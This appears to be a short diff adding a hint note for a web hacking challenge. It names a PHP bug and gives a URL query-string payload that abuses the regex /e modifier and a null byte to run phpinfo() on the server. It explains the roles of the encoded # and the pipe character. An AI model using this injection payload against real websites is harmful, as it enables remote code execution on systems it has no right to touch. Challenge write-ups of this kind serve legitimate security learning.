@@ -1,0 +1,8 @@
+this one is stupidly hard and the code shown doesn't really help you
+
+relies on exploiting php bug 55856
+
+?search=phpinfo();%23|kiwi/e%00&submit=Search
+
+the %23 is a #
+the | is key
